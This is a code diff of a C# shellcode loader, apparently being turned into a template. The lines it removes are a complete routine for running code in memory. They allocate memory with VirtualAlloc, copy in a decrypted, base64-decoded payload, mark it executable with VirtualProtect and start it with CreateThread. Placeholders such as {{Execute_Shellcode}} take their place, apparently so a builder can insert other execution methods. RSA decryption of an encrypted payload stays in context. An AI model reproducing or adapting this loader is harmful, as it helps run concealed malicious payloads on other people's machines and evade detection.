@@ -9,6 +9,7 @@ using System.Threading;
 
 namespace shellcode
 {
+	[ComVisible(true)]
     class Program
     {
         public static string Decrypt(string Text, string key, string iv)
@@ -83,41 +84,9 @@ namespace shellcode
             }
             string payload = Encoding.Default.GetString(decryptedData);
             byte[] mydata = Convert.FromBase64String(payload);
-            UInt32 funcAddr = VirtualAlloc(0, (UInt32)mydata.Length,
-                MEM_COMMIT, PAGE_READWRITE);
-            Marshal.Copy(mydata, 0, (IntPtr)(funcAddr), mydata.Length);
-            uint oldprotection;
-            VirtualProtect((IntPtr)(funcAddr), mydata.Length, PAGE_EXECUTE, out oldprotection);
-            IntPtr hThread = IntPtr.Zero;
-            UInt32 threadId = 0;
-            IntPtr pinfo = IntPtr.Zero;
-			Console.Write("All checks have passed. Let's GO~");
-            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
+{{Execute_Shellcode}}
         }
-        private static UInt32 MEM_COMMIT = 0x1000;
-        private static UInt32 PAGE_READWRITE = 0x04;
-        private static UInt32 PAGE_EXECUTE = 0x10;
-        [DllImport("kernel32")]
-        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
-            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
-
-        [DllImport("kernel32")]
-        static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
-        [DllImport("kernel32")]
-        private static extern IntPtr CreateThread(
-            UInt32 lpThreadAttributes,
-            UInt32 dwStackSize,
-            UInt32 lpStartAddress,
-            IntPtr param,
-            UInt32 dwCreationFlags,
-            ref UInt32 lpThreadId
-        );
-        [DllImport("kernel32")]
-        private static extern UInt32 WaitForSingleObject(
-            IntPtr hHandle,
-            UInt32 dwMilliseconds
-        );
+{{Execute_Shellcode_Method}}
         private static byte[] DecryptedDataMethod(RSACryptoServiceProvider rsa, byte[] orgData, ArrayList arrDecrypteToTxt, int DecryptedSize)
         {
             byte[] DecryptedData = null;
